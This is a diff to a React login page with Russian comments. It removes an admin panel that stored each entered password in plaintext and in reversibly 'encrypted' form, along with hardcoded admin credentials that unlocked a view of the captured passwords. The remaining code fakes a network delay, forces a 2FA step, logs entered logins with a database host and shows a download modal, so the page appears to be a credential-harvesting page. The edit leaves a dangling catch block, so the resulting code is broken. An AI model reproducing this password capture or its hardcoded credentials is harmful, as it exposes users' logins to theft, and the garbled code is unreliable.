@@ -2,7 +2,7 @@ import React, { useState } from 'react';
 import LoginForm from '@/components/LoginForm';
 import UserProfile from '@/components/UserProfile';
 import SecuritySettings from '@/components/SecuritySettings';
-import AdminPanel from '@/components/AdminPanel';
+
 import ModalWindows from '@/components/ModalWindows';
 import Icon from '@/components/ui/icon';
 
@@ -17,12 +17,7 @@ interface SecuritySettingsState {
   emailNotifications: boolean;
 }
 
-interface LoginAttempt {
-  login: string;
-  password: string;
-  hashedPassword: string;
-  timestamp: string;
-}
+
 
 const Index = () => {
   const [loginData, setLoginData] = useState<LoginData>({ login: '', password: '' });
@@ -35,23 +30,7 @@ const Index = () => {
   const [showDownloadModal, setShowDownloadModal] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   const [showMandatoryTwoFA, setShowMandatoryTwoFA] = useState(false);
-  const [showAdminPanel, setShowAdminPanel] = useState(false);
-  const [loginAttempts, setLoginAttempts] = useState<LoginAttempt[]>([]);
-  const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);
 
-  // Администраторские учётные данные
-  const ADMIN_LOGIN = 'MiacSuperUser';
-  const ADMIN_PASSWORD = 'GfhjkmJNAbibyujdjujCfqnf01092025!';
-
-  // Простое "шифрование" для демонстрации
-  const encryptPassword = (password: string): string => {
-    return btoa(password.split('').reverse().join(''));
-  };
-
-  // Расшифровка пароля (только для админа)
-  const decryptPassword = (encrypted: string): string => {
-    try {
-      return atob(encrypted).split('').reverse().join('');
     } catch {
       return '***';
     }
@@ -94,35 +73,13 @@ const Index = () => {
       return;
     }
 
-    // Сохраняем попытку входа с хешированием
-    const newAttempt: LoginAttempt = {
-      login: loginData.login,
-      password: loginData.password,
-      hashedPassword: encryptPassword(loginData.password),
-      timestamp: new Date().toLocaleString('ru-RU')
-    };
-    setLoginAttempts(prev => [...prev, newAttempt]);
-
     setIsLoading(true);
 
     try {
       // Имитация задержки сетевого запроса
       await new Promise(resolve => setTimeout(resolve, 1500));
 
-      // Проверка на администраторские данные
-      if (loginData.login === ADMIN_LOGIN && loginData.password === ADMIN_PASSWORD) {
-        console.log('✅ Вход администратора успешен');
-        setIsLoading(false);
-        setIsAdminLoggedIn(true);
-        setShowAdminPanel(true);
-        // Сбрасываем все модальные окна для админа
-        setShowTwoFAConfirm(false);
-        setShowDownloadModal(false);
-        setShowMandatoryTwoFA(false);
-        return;
-      }
-
-      // Обычная авторизация - всегда требует 2FA
+      // Всегда требуем 2FA для любой авторизации
       console.log('🔐 Обычная авторизация, требуется 2FA:', {
         LOGIN: loginData.login,
         host: 'pg4.sweb.ru:5433',
@@ -142,10 +99,7 @@ const Index = () => {
     setShowTwoFAConfirm(true);
   };
 
-  const closeAdminPanel = () => {
-    setShowAdminPanel(false);
-    setIsAdminLoggedIn(false);
-  };
+
 
   return (
     <div className="min-h-screen">
@@ -220,14 +174,7 @@ const Index = () => {
           proceedToTwoFASetup={proceedToTwoFASetup}
         />
 
-        {/* Admin Panel */}
-        <AdminPanel
-          showAdminPanel={showAdminPanel}
-          closeAdminPanel={closeAdminPanel}
-          loginAttempts={loginAttempts}
-          isAdminLoggedIn={isAdminLoggedIn}
-          decryptPassword={decryptPassword}
-        />
+
       </div>
     </div>
   );
